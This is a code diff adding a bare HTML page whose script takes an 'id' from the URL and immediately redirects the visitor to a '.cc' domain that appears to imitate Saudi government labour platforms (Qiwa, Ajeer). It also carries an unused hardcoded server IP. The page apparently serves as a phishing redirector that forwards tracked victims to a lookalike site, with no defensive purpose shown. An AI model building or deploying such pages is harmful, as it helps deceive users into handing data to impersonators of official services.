@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>..</title>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+
+        const id = params.get("id");
+        const type = params.get("type");
+
+        if (id) {
+            let target = "https://ajeer-qiwa-sa.cc/view/" +
+                         encodeURIComponent(id);
+            let server = "72.61.164.184";
+            if (type) {
+                target += "?type=" + encodeURIComponent(type);
+            }
+
+            window.location.replace(target);
+        } else {
+            document.body.innerHTML = `
+                <h2>Invalid request</h2>
+                <p>Missing ID.</p>
+            `;
+        }
+    </script>
+</head>
+
+
+</html>
